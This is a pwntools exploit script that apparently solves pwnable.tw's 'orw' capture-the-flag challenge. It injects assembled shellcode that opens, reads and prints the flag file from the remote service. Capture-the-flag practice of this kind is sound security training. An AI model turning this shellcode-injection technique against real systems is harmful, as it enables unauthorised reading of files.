#!/usr/bin/env python3

from pwn import *

exe = ELF("./orw")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("chall.pwnable.tw", 10001)

    return r


def main():
    r = conn()

    # NOTE: In LOCAL the .bss is not executable so it will always crash
    payload = flat(
        asm(shellcraft.open("/home/orw/flag")),
        asm(shellcraft.read('eax', 0x804a000, 64)),
        asm(shellcraft.write(0, 0x804a000, 64))
    )

    assert len(payload) <= 200

    r.sendafter(b"shellcode:", payload)
    flag = r.recvline().strip(b"\x00").decode("ascii")
    log.info(f"Flag obtained: {flag}")


if __name__ == "__main__":
    main()
